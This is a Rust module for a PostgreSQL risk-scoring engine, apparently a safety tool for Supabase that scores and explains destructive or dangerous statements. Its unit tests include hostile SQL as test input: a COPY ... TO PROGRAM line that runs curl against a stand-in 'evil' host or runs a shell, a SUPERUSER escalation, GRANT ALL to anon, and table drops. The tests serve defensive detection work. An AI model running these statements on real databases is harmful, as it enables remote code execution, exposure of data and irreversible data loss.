//! The risk engine.
//!
//! Every statement gets a score from 0 to 100 together with the list of
//! factors that produced it. The list matters as much as the number: a score
//! nobody can explain is a score nobody will trust, and an engineer staring at
//! a blocked deploy at 2am needs to know *why* in one screen.
//!
//! Scores are deliberately independent of the environment. `DROP TABLE` is a
//! 100 on a laptop and a 100 in production; what changes is the policy that
//! reads the score. Keeping the two separate means the number means the same
//! thing everywhere it is displayed.

use serde::{Deserialize, Serialize};
use std::fmt;
use supasafe_parser::{Selectivity, StatementAnalysis, StatementKind};

/// A named contribution to a statement's score.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RiskFactor {
    /// Stable identifier, for policies that want to match on a factor.
    pub code: String,
    /// A sentence a human can act on.
    pub description: String,
    /// Points added (or removed) by this factor.
    pub delta: i32,
    /// A score this factor will not let the total fall below.
    pub floor: Option<u8>,
}

impl RiskFactor {
    fn new(code: &str, description: impl Into<String>, delta: i32) -> Self {
        Self {
            code: code.to_string(),
            description: description.into(),
            delta,
            floor: None,
        }
    }

    fn floored(code: &str, description: impl Into<String>, floor: u8) -> Self {
        Self {
            code: code.to_string(),
            description: description.into(),
            delta: 0,
            floor: Some(floor),
        }
    }
}

/// A band, for colour coding and for policies that prefer words to numbers.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RiskLevel {
    /// 0. Reads nothing changes.
    None,
    /// 1-24. Routine writes.
    Low,
    /// 25-49. Worth noticing.
    Moderate,
    /// 50-79. Wide-reaching changes.
    High,
    /// 80-94. Destructive, recoverable only from a backup.
    Critical,
    /// 95-100. Irreversible loss of data or control.
    Catastrophic,
}

impl RiskLevel {
    pub fn of(score: u8) -> RiskLevel {
        match score {
            0 => RiskLevel::None,
            1..=24 => RiskLevel::Low,
            25..=49 => RiskLevel::Moderate,
            50..=79 => RiskLevel::High,
            80..=94 => RiskLevel::Critical,
            _ => RiskLevel::Catastrophic,
        }
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            RiskLevel::None => "none",
            RiskLevel::Low => "low",
            RiskLevel::Moderate => "moderate",
            RiskLevel::High => "high",
            RiskLevel::Critical => "critical",
            RiskLevel::Catastrophic => "catastrophic",
        }
    }

    pub fn parse(s: &str) -> Option<RiskLevel> {
        match s.trim().to_ascii_lowercase().as_str() {
            "none" => Some(RiskLevel::None),
            "low" => Some(RiskLevel::Low),
            "moderate" | "medium" => Some(RiskLevel::Moderate),
            "high" => Some(RiskLevel::High),
            "critical" => Some(RiskLevel::Critical),
            "catastrophic" => Some(RiskLevel::Catastrophic),
            _ => None,
        }
    }

    /// The lowest score in this band, for converting a word back to a
    /// threshold.
    pub fn min_score(&self) -> u8 {
        match self {
            RiskLevel::None => 0,
            RiskLevel::Low => 1,
            RiskLevel::Moderate => 25,
            RiskLevel::High => 50,
            RiskLevel::Critical => 80,
            RiskLevel::Catastrophic => 95,
        }
    }
}

impl fmt::Display for RiskLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// A statement's score with its full derivation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RiskScore {
    pub score: u8,
    pub level: RiskLevel,
    /// The score before modifiers, from the statement kind alone.
    pub base: u8,
    pub factors: Vec<RiskFactor>,
}

impl RiskScore {
    /// The single most important reason for the score.
    pub fn headline(&self) -> Option<&RiskFactor> {
        self.factors
            .iter()
            .max_by_key(|f| (f.floor.unwrap_or(0) as i32, f.delta))
    }

    /// Every factor description, most significant first.
    pub fn explain(&self) -> Vec<String> {
        let mut factors: Vec<&RiskFactor> = self.factors.iter().collect();
        factors.sort_by_key(|f| -((f.floor.unwrap_or(0) as i32).max(f.delta)));
        factors.iter().map(|f| f.description.clone()).collect()
    }
}

/// Everything the engine needs beyond the statement itself.
#[derive(Debug, Clone, Default)]
pub struct RiskInput {
    /// Rows the statement is expected to touch, when a live estimate is
    /// available.
    pub estimated_rows: Option<u64>,
    /// The statement is running inside an explicit transaction the client can
    /// still roll back.
    pub in_transaction: bool,
    /// Rows currently in the target table, when known.
    pub table_rows: Option<u64>,
}

/// Score a statement.
pub fn score(stmt: &StatementAnalysis, input: &RiskInput) -> RiskScore {
    let mut factors: Vec<RiskFactor> = Vec::new();
    let base = base_score(stmt, &mut factors);

    modifiers(stmt, input, &mut factors);

    let sum: i32 = base as i32 + factors.iter().map(|f| f.delta).sum::<i32>();
    let floor = factors.iter().filter_map(|f| f.floor).max().unwrap_or(0);
    let score = sum.clamp(0, 100).max(floor as i32) as u8;

    RiskScore {
        score,
        level: RiskLevel::of(score),
        base,
        factors,
    }
}

/// The score a statement carries from its kind and shape alone.
fn base_score(stmt: &StatementAnalysis, factors: &mut Vec<RiskFactor>) -> u8 {
    use StatementKind::*;

    let describe = |f: &mut Vec<RiskFactor>, code: &str, msg: &str| {
        f.push(RiskFactor::new(code, msg.to_string(), 0));
    };

    match stmt.kind {
        // ---- reads ----
        Select | Explain | Show | Fetch | CopyTo => 0,

        // ---- writes ----
        Insert => 15,

        Update => match stmt.selectivity() {
            // An UPDATE with no usable filter rewrites the whole table.
            Selectivity::Unbounded => {
                describe(
                    factors,
                    "update_without_where",
                    "this UPDATE has no effective WHERE clause, so it rewrites every row in the table",
                );
                98
            }
            Selectivity::Broad => 60,
            Selectivity::Narrow => 25,
            Selectivity::SingleRow => 10,
        },

        Delete => match stmt.selectivity() {
            Selectivity::Unbounded => {
                describe(
                    factors,
                    "delete_without_where",
                    "this DELETE has no effective WHERE clause, so it removes every row in the table",
                );
                100
            }
            Selectivity::Broad => 70,
            Selectivity::Narrow => 35,
            Selectivity::SingleRow => 20,
        },

        Merge => 55,

        Truncate => {
            describe(
                factors,
                "truncate",
                "TRUNCATE empties the table without per-row WAL, so it cannot be undone by \
                 replaying the log or caught by a row trigger",
            );
            95
        }

        CopyFrom => 30,

        // ---- destructive DDL ----
        DropDatabase => {
            describe(
                factors,
                "drop_database",
                "DROP DATABASE destroys the entire database and everything in it",
            );
            100
        }
        DropSchema => {
            describe(
                factors,
                "drop_schema",
                "DROP SCHEMA destroys every table, view and function inside the schema",
            );
            100
        }
        DropTable => {
            describe(
                factors,
                "drop_table",
                "DROP TABLE destroys the table and all of its data; PostgreSQL keeps no copy",
            );
            100
        }
        DropMaterializedView => 60,
        DropView => 55,
        DropIndex => 55,
        DropSequence => 70,
        DropType => 60,
        DropFunction | DropProcedure => 55,
        DropTrigger => {
            describe(
                factors,
                "drop_trigger",
                "dropping a trigger silently removes the integrity or audit logic it enforced",
            );
            65
        }
        DropPolicy => {
            describe(
                factors,
                "drop_policy",
                "dropping a row level security policy can expose every row of the table",
            );
            90
        }
        DropExtension => 70,
        DropRole => 70,
        DropOther => 70,

        // ---- schema changes ----
        AlterTable => {
            if stmt.flags.drops_column {
                describe(
                    factors,
                    "drop_column",
                    "dropping a column destroys the values stored in it; there is no undo short \
                     of a restore",
                );
                98
            } else if stmt.flags.weakens_rls {
                85
            } else if stmt.flags.changes_column_type {
                70
            } else if stmt.flags.drops_constraint {
                65
            } else if stmt.flags.renames {
                60
            } else if stmt.flags.changes_owner {
                75
            } else if stmt.flags.adds_column {
                20
            } else {
                40
            }
        }
        AlterSchema => 60,
        AlterPolicy => 80,
        AlterRole => 60,
        AlterIndex | AlterView | AlterFunction | AlterType | AlterOther => 40,

        // ---- additive DDL ----
        CreateTable
        | CreateIndex
        | CreateView
        | CreateMaterializedView
        | CreateSequence
        | CreateType
        | CreateDomain
        | CreateSchema
        | CreatePolicy
        | CreateOther => 15,
        CreateFunction | CreateProcedure | CreateTrigger => 25,
        CreateExtension => {
            describe(
                factors,
                "create_extension",
                "installing an extension loads code into the database server",
            );
            45
        }
        CreateDatabase => 30,
        CreateRole => 50,

        // ---- permissions ----
        Grant => 55,
        Revoke => 45,
        Deny => 45,
        Comment => 5,

        // ---- maintenance ----
        Vacuum | Analyze => 10,
        Reindex | Cluster => 45,
        Checkpoint => 15,

        // ---- execution ----
        Call | Execute => 45,
        DoBlock => {
            describe(
                factors,
                "do_block",
                "a DO block runs procedural code that cannot be inspected before it executes",
            );
            55
        }

        // ---- transaction and session ----
        Begin | Commit | Savepoint | ReleaseSavepoint => 0,
        Rollback => 0,
        Set | Reset | Discard | Prepare | Deallocate | Declare | Close | Listen | Unlisten
        | Notify | Use => 5,
        Lock => 35,

        // ---- unknown ----
        Unknown => {
            describe(
                factors,
                "unknown_statement",
                "SupaSafe could not determine what this statement does",
            );
            70
        }
    }
}

/// Aggravating and mitigating factors applied on top of the base score.
fn modifiers(stmt: &StatementAnalysis, input: &RiskInput, factors: &mut Vec<RiskFactor>) {
    // --- managed surfaces -------------------------------------------------
    for obj in stmt.protected_objects() {
        if let Some(why) = obj.surface.why_it_matters() {
            let floor = if obj.access.is_lossy() { 100 } else { 90 };
            factors.push(RiskFactor::floored(
                "protected_surface",
                format!("{} is on a protected surface: {why}", obj.as_written()),
                floor,
            ));
        }
    }

    // --- structural aggravators -------------------------------------------
    if stmt.flags.cascade {
        factors.push(RiskFactor::new(
            "cascade",
            "CASCADE extends this change to dependent objects the statement does not name",
            10,
        ));
    }

    if stmt.flags.weakens_rls {
        factors.push(RiskFactor::floored(
            "weakens_rls",
            "this removes a row level security boundary, which on Supabase can expose every row \
             of the table to anyone holding the anon key",
            90,
        ));
    }

    if stmt.flags.grants_elevated_role {
        factors.push(RiskFactor::floored(
            "privilege_escalation",
            "this grants an elevated role attribute, which removes every other safety boundary \
             in the database",
            95,
        ));
    }

    if stmt.flags.grants_all && stmt.flags.grants_to_public {
        factors.push(RiskFactor::floored(
            "grant_all_public",
            "GRANT ALL to a public role gives every caller full access to these objects",
            85,
        ));
    }

    if stmt.flags.copy_program {
        factors.push(RiskFactor::floored(
            "command_execution",
            "COPY ... PROGRAM runs a shell command on the database host; this is remote code \
             execution, not a database operation",
            100,
        ));
    }

    if stmt.flags.copy_file {
        factors.push(RiskFactor::new(
            "server_filesystem",
            "this reads or writes a file on the database server's filesystem",
            15,
        ));
    }

    if stmt.flags.changes_owner {
        factors.push(RiskFactor::new(
            "ownership_change",
            "changing the owner transfers full control of the object to another role",
            15,
        ));
    }

    if stmt.flags.disables_trigger {
        factors.push(RiskFactor::new(
            "disables_trigger",
            "disabling a trigger turns off whatever it enforced, and nothing in the data will \
             show it happened",
            15,
        ));
    }

    if stmt.flags.security_definer {
        factors.push(RiskFactor::new(
            "security_definer",
            "a SECURITY DEFINER routine runs with its owner's privileges and bypasses row level \
             security for its caller",
            20,
        ));
    }

    if stmt.flags.opaque_body_is_destructive {
        factors.push(RiskFactor::floored(
            "hidden_destruction",
            "the body of this routine contains destructive statements that will run without \
             further inspection",
            85,
        ));
    } else if stmt.flags.opaque_body {
        factors.push(RiskFactor::new(
            "opaque_body",
            "this executes a body that static analysis cannot see into",
            10,
        ));
    }

    if !stmt.parsed {
        factors.push(RiskFactor::new(
            "unparsed",
            "this statement could not be parsed into a syntax tree, so it was classified from \
             its tokens and cannot be fully verified",
            25,
        ));
    }

    if stmt.flags.multi_table && stmt.kind.is_write() {
        factors.push(RiskFactor::new(
            "multi_table",
            "this statement writes across more than one table",
            5,
        ));
    }

    if stmt.flags.changes_column_type {
        factors.push(RiskFactor::new(
            "table_rewrite",
            "changing a column type rewrites the whole table under a lock that blocks every \
             reader and writer",
            10,
        ));
    }

    if stmt.kind == StatementKind::CreateIndex && !stmt.flags.concurrently {
        factors.push(RiskFactor::new(
            "blocking_index_build",
            "building an index without CONCURRENTLY blocks writes to the table until it finishes",
            15,
        ));
    }

    // --- volume ------------------------------------------------------------
    if let Some(rows) = input.estimated_rows {
        if stmt.kind.is_write() || stmt.is_data_destructive() {
            let (delta, msg) = match rows {
                0 => (
                    -5,
                    "the planner estimates this statement affects no rows".to_string(),
                ),
                1..=10 => (0, format!("about {rows} rows affected")),
                11..=1_000 => (5, format!("about {rows} rows affected")),
                1_001..=100_000 => (10, format!("about {rows} rows affected")),
                100_001..=1_000_000 => (
                    15,
                    format!(
                        "about {rows} rows affected, which is a substantial share of a \
                             typical table"
                    ),
                ),
                _ => (
                    20,
                    format!(
                        "about {rows} rows affected; a statement this large will hold locks \
                             and generate WAL for a long time"
                    ),
                ),
            };
            factors.push(RiskFactor::new("row_volume", msg, delta));
        }
    }

    // --- mitigations -------------------------------------------------------
    if input.in_transaction && !stmt.kind.is_schema_change() {
        // An open transaction means the client can still issue ROLLBACK. It is
        // a real mitigation, but a small one: nothing stops the agent from
        // committing.
        factors.push(RiskFactor::new(
            "in_transaction",
            "this runs inside an open transaction, so it can still be rolled back",
            -5,
        ));
    }

    if stmt.predicate.always_false {
        factors.push(RiskFactor::new(
            "no_op",
            "the WHERE clause can never be true, so this statement affects nothing",
            -40,
        ));
    }

    if stmt.limit.is_some() && stmt.kind.is_write() {
        factors.push(RiskFactor::new(
            "explicit_limit",
            "an explicit LIMIT bounds how many rows this can touch",
            -10,
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use supasafe_parser::analyze_statement;

    fn s(sql: &str) -> RiskScore {
        score(&analyze_statement(sql), &RiskInput::default())
    }

    // The scores below are the contract the README and the docs quote. If one
    // of these changes, the change is a documented behaviour change.

    #[test]
    fn select_is_zero() {
        assert_eq!(s("SELECT * FROM users").score, 0);
        assert_eq!(s("SELECT * FROM users").level, RiskLevel::None);
    }

    #[test]
    fn insert_is_fifteen() {
        assert_eq!(s("INSERT INTO users (id) VALUES (1)").score, 15);
    }

    #[test]
    fn delete_without_where_is_one_hundred() {
        assert_eq!(s("DELETE FROM users").score, 100);
        assert_eq!(s("DELETE FROM users WHERE 1=1").score, 100);
    }

    #[test]
    fn update_without_where_is_ninety_eight() {
        assert_eq!(s("UPDATE users SET active = false").score, 98);
    }

    #[test]
    fn truncate_is_at_least_ninety_five() {
        assert_eq!(s("TRUNCATE TABLE events").score, 95);
        // CASCADE pushes it to the top of the scale.
        assert_eq!(s("TRUNCATE TABLE events CASCADE").score, 100);
    }

    #[test]
    fn drops_are_one_hundred() {
        assert_eq!(s("DROP TABLE users").score, 100);
        assert_eq!(s("DROP SCHEMA public").score, 100);
        assert_eq!(s("DROP DATABASE app").score, 100);
    }

    #[test]
    fn drop_column_is_ninety_eight() {
        assert_eq!(s("ALTER TABLE users DROP COLUMN email").score, 98);
    }

    #[test]
    fn scoped_writes_score_low() {
        assert!(s("DELETE FROM users WHERE id = 1").score <= 25);
        assert!(s("UPDATE users SET name = 'x' WHERE id = 1").score <= 15);
    }

    #[test]
    fn every_score_is_in_range() {
        for sql in [
            "SELECT 1",
            "DROP DATABASE x",
            "TRUNCATE a CASCADE",
            "DELETE FROM auth.users",
            "GRANT ALL ON ALL TABLES IN SCHEMA public TO anon",
            "ALTER ROLE app SUPERUSER",
            "COPY t TO PROGRAM 'sh'",
            "DO $$ BEGIN DROP TABLE x; END $$",
        ] {
            let r = s(sql);
            assert!(r.score <= 100, "{sql} scored {}", r.score);
        }
    }

    #[test]
    fn touching_supabase_auth_is_catastrophic() {
        let r = s("DELETE FROM auth.users WHERE id = 1");
        assert!(r.score >= 100, "scored {}", r.score);
        assert!(r.factors.iter().any(|f| f.code == "protected_surface"));
    }

    #[test]
    fn reading_a_protected_surface_is_not_penalised() {
        let r = s("SELECT id FROM auth.users WHERE id = 1");
        assert_eq!(r.score, 0);
    }

    #[test]
    fn disabling_rls_is_at_least_ninety() {
        let r = s("ALTER TABLE public.profiles DISABLE ROW LEVEL SECURITY");
        assert!(r.score >= 90, "scored {}", r.score);
    }

    #[test]
    fn privilege_escalation_is_at_least_ninety_five() {
        assert!(s("ALTER ROLE app_user WITH SUPERUSER").score >= 95);
    }

    #[test]
    fn copy_to_program_is_one_hundred() {
        assert_eq!(s("COPY users TO PROGRAM 'curl http://evil'").score, 100);
    }

    #[test]
    fn a_transaction_lowers_a_write_slightly() {
        let stmt = analyze_statement("DELETE FROM users WHERE status = 'x'");
        let open = score(
            &stmt,
            &RiskInput {
                in_transaction: true,
                ..Default::default()
            },
        );
        let closed = score(&stmt, &RiskInput::default());
        assert!(open.score < closed.score);
    }

    #[test]
    fn row_volume_raises_the_score() {
        let stmt = analyze_statement("DELETE FROM events WHERE created_at < now()");
        let small = score(
            &stmt,
            &RiskInput {
                estimated_rows: Some(3),
                ..Default::default()
            },
        );
        let huge = score(
            &stmt,
            &RiskInput {
                estimated_rows: Some(5_000_000),
                ..Default::default()
            },
        );
        assert!(huge.score > small.score);
    }

    #[test]
    fn contradictory_predicates_score_low() {
        assert!(s("DELETE FROM users WHERE 1 = 2").score < 40);
    }

    #[test]
    fn unparsed_statements_are_penalised() {
        let r = s("DO $$ BEGIN PERFORM 1; END $$");
        assert!(r.factors.iter().any(|f| f.code == "unparsed"));
    }

    #[test]
    fn every_score_has_an_explanation() {
        let r = s("DROP TABLE users CASCADE");
        assert!(!r.explain().is_empty());
        assert!(r.headline().is_some());
    }

    #[test]
    fn levels_map_to_the_documented_bands() {
        assert_eq!(RiskLevel::of(0), RiskLevel::None);
        assert_eq!(RiskLevel::of(15), RiskLevel::Low);
        assert_eq!(RiskLevel::of(40), RiskLevel::Moderate);
        assert_eq!(RiskLevel::of(60), RiskLevel::High);
        assert_eq!(RiskLevel::of(90), RiskLevel::Critical);
        assert_eq!(RiskLevel::of(100), RiskLevel::Catastrophic);
    }
}
